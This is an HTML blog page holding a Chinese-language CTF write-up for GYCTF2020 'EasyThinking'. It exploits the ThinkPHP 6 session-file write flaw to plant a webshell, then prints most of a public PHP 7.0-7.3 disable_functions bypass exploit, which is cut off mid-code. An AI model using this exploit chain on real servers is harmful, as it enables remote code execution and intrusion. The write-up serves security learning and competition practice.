@@ -1,0 +1,701 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>GYCTF2020 - EasyThinking - Yueyejian’s Blog</title>
+<meta name="description" content="GYCTF2020 - EasyThinking ThinkPHP6.0.0-6.0.1任意文件操作漏洞 随便测试一下发现框架是Tp6，就很容易让人想到前阵子爆出的Tp6由于sessionId处理不当造成的任意文件操作漏洞。 漏洞分析：https://paper.seebug.org/1114/">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="GYCTF2020 - EasyThinking">
+<meta property="og:url" content="http://localhost:4000/ctf/easythinking/">
+
+
+  <meta property="og:description" content="GYCTF2020 - EasyThinking ThinkPHP6.0.0-6.0.1任意文件操作漏洞 随便测试一下发现框架是Tp6，就很容易让人想到前阵子爆出的Tp6由于sessionId处理不当造成的任意文件操作漏洞。 漏洞分析：https://paper.seebug.org/1114/">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-03-28T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/ctf/easythinking/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="GYCTF2020 - EasyThinking">
+    <meta itemprop="description" content="GYCTF2020 - EasyThinkingThinkPHP6.0.0-6.0.1任意文件操作漏洞随便测试一下发现框架是Tp6，就很容易让人想到前阵子爆出的Tp6由于sessionId处理不当造成的任意文件操作漏洞。漏洞分析：https://paper.seebug.org/1114/">
+    <meta itemprop="datePublished" content="2020-03-28T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">GYCTF2020 - EasyThinking
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-03-28T00:00:00+08:00">March 28, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#gyctf2020---easythinking">GYCTF2020 - EasyThinking</a><ul><li><a href="#thinkphp600-601任意文件操作漏洞">ThinkPHP6.0.0-6.0.1任意文件操作漏洞</a></li><li><a href="#代码审计文件上传">代码审计&amp;&amp;文件上传</a></li><li><a href="#bypass-disable_function">Bypass disable_function</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="gyctf2020---easythinking">GYCTF2020 - EasyThinking</h1>
+<h2 id="thinkphp600-601任意文件操作漏洞">ThinkPHP6.0.0-6.0.1任意文件操作漏洞</h2>
+<p>随便测试一下发现框架是Tp6，就很容易让人想到前阵子爆出的Tp6由于sessionId处理不当造成的任意文件操作漏洞。
+漏洞分析：<a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p>
+
+<p><img src="/images/ctf/easythinking/0.jpg" alt="" /></p>
+
+<h2 id="代码审计文件上传">代码审计&amp;&amp;文件上传</h2>
+<p>目录扫描之后发现 www.zip，下载之后审计一下</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">function</span> <span class="n">search</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nc">Request</span><span class="o">::</span><span class="nf">isPost</span><span class="p">()){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">session</span><span class="p">(</span><span class="s1">'?UID'</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="s1">'/home/member/login'</span><span class="p">);</span>            
+            <span class="p">}</span>
+            <span class="nv">$data</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="s2">"post."</span><span class="p">);</span>
+            <span class="nv">$record</span> <span class="o">=</span> <span class="nf">session</span><span class="p">(</span><span class="s2">"Record"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">session</span><span class="p">(</span><span class="s2">"Record"</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="nf">session</span><span class="p">(</span><span class="s2">"Record"</span><span class="p">,</span><span class="nv">$data</span><span class="p">[</span><span class="s2">"key"</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="nv">$recordArr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span><span class="nv">$record</span><span class="p">);</span>
+                <span class="nv">$recordLen</span> <span class="o">=</span> <span class="nb">sizeof</span><span class="p">(</span><span class="nv">$recordArr</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$recordLen</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">){</span>
+                    <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$recordArr</span><span class="p">);</span>
+                    <span class="nf">session</span><span class="p">(</span><span class="s2">"Record"</span><span class="p">,</span><span class="nb">implode</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span><span class="nv">$recordArr</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">","</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">[</span><span class="s2">"key"</span><span class="p">]);</span>
+                    <span class="k">return</span> <span class="nc">View</span><span class="o">::</span><span class="nf">fetch</span><span class="p">(</span><span class="s2">"result"</span><span class="p">,[</span><span class="s2">"res"</span> <span class="o">=&gt;</span> <span class="s2">"There's nothing here"</span><span class="p">]);</span>
+                <span class="p">}</span>
+
+            <span class="p">}</span>
+            <span class="nf">session</span><span class="p">(</span><span class="s2">"Record"</span><span class="p">,</span><span class="nv">$record</span> <span class="mf">.</span> <span class="s2">","</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">[</span><span class="s2">"key"</span><span class="p">]);</span>
+            <span class="k">return</span> <span class="nc">View</span><span class="o">::</span><span class="nf">fetch</span><span class="p">(</span><span class="s2">"result"</span><span class="p">,[</span><span class="s2">"res"</span> <span class="o">=&gt;</span> <span class="s2">"There's nothing here"</span><span class="p">]);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">return</span> <span class="nf">View</span><span class="p">(</span><span class="s2">"search"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>发现 search搜索的地方有一个 session 的储存。</p>
+
+<p>先注册一个账号，登录，然后搜索的时候抓包。</p>
+
+<p>thinkphp6 会默认在 /runtime/session 创建一个sess_xxx格式的session文件，这里的xxx就是PHPSESSID（必须是32位），而文件的内容就是session的内容，也就是key的内容。</p>
+
+<p><img src="/images/ctf/easythinking/1.jpg" alt="" /></p>
+
+<p>改完包后我们访问一下这个文件</p>
+
+<p><img src="/images/ctf/easythinking/2.jpg" alt="" /></p>
+
+<p>发现禁止了一些函数</p>
+
+<p><img src="/images/ctf/easythinking/3.jpg" alt="" /></p>
+
+<h2 id="bypass-disable_function">Bypass disable_function</h2>
+
+<p>7.3版本的php，于是写入一个一句话木马，用antsword连接，上传一个绕过disable_functions的脚本</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="c1"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span>
+<span class="c1">#
+# Bug: https://bugs.php.net/bug.php?id=72530</span>
+<span class="c1">#
+# This exploit should work on all PHP 7.0-7.3 versions</span>
+<span class="c1">#
+# Author: https://github.com/mm0r1</span>
+
+<span class="nf">pwn</span><span class="p">(</span><span class="s2">"/readflag"</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="n">pwn</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="n">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
+            <span class="nv">$address</span> <span class="o">|=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$out</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
+            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
+            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
+        <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+        <span class="nv">$leak</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
+            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write</span>
+                <span class="c1"># handle pie</span>
+                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
+                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec</span>
+                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'constant' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'bin2hex' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header</span>
+                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
+        <span class="k">do</span> <span class="p">{</span>
+            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
+            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system</span>
+                <span class="k">return</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">class</span> <span class="nc">ryat</span> <span class="p">{</span>
+        <span class="k">var</span> <span class="nv">$ryat</span><span class="p">;</span>
+        <span class="k">var</span> <span class="nv">$chtg</span><span class="p">;</span>
+
+        <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">chtg</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ryat</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ryat</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">class</span> <span class="nc">Helper</span> <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">,</span> <span class="nv">$d</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WIN'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'This PoC is for *nix systems only.'</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1"># increase this value if you get segfaults</span>
+
+    <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
